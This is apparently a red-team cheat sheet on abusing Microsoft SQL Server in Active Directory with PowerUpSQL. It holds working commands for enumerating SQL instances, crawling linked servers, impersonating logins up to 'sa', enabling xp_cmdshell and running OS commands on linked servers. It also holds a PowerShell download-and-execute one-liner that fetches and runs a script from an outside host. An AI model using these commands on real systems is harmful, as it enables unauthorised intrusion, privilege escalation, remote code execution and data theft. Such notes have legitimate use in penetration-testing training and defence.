## Forest Trusts MSSQL Abuse [ Part 1 ]

## Methodology/Steps
> 1. Check the SPN's
> 2. Check which SPN's you have access to
> 3. Check the Privileges you have of the above filtered SPN's
> 4. Keep note of the **Instance-Name**, **ServicePrincipalName** and the **DomainAccount-Name**
> 5. If you find any service with *higher privileges* continue below to abuse it

## 1. Enumerate SPN
```powershell
Get-SQLInstanceDomain
```

## 2. Check Access
```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

## 3. Check Privileges / Gather Infromation
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

# Extra
## Check impersonation rights
```powershell
Invoke-SQLAudit -Verbose -Instance <instanceName>
```
---

# MSSQL Database Links [ MSSQL Abuse ; Part 2 ]

## Methodology/Steps
> 1. Check the SQL Server link
> 2. Keep note if you have link to any other database in **DatabaseLinkName**
> 3. If SysAdmin:0 means that we will not be allowed to enable **xp_cmdshell**
> 4. Keep on enumerating and check all the linked databases you have access to
> 5. Now we can try to execute commands through out all the linked databases found

## 1. Enumerate SQL Server links
```powershell
Get-SQLServerLink -Instance <instanceName> -Verbose
select * from master..sysservers
```

## 2. Enumerate DB links
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mysql -Verbose
select * from openquery("<instanceName>",'select * from openquery("<linkedInstance>",''select * from master..sysservers'')')
```

## 3. Execute commands on target server
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mysql -Query "exec master..xp_cmdshell 'whoami'" | ft
```

## 4. Download file on target server
```powershell
Get-SQLServerLinkCrawl -Instance <instanceName> -Query 'exec master..xp_cmdshell "powershell -c iex (new-object net.webclient).downloadstring(''http://IP:8080/Invoke-HelloWorld.ps1'',''C:\Windows\Temp\Invoke-HelloWorld.ps1'')"'
```

# Extra Commands
## Impersonate an user
```powershell
Invoke-SQLAuditPrivImpersonateLogin -Instance <instanceName> -Exploit -Verbose

#Then, we can EXECUTE AS, and chained the 'EXECUTE AS'
Get-SQLServerLinkCrawl -Verbose -Instance <instanceName> -Query "EXECUTE AS LOGIN = 'dbuser'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master..xp_cmdshell 'powershell -c iex (new-object net.webclient).downloadstring(''http://IP/Invoke-HelloWorld.ps1'')'"
```

## Basic SQL Server queries for DB enumeration
Also works with **Get-SQLServerLinkCrawl**
```powershell
#View all db in an instance
Get-SQLQuery -Instance <instanceName> -Query "SELECT name FROM sys.databases"

#View all tables
Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.TABLES" 

#View all cols in all tables in a db
Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.columns"

#View data in table
Get-SQLQuery -Instance <instanceName> -Query "USE dbName;SELECT * FROM tableName"
```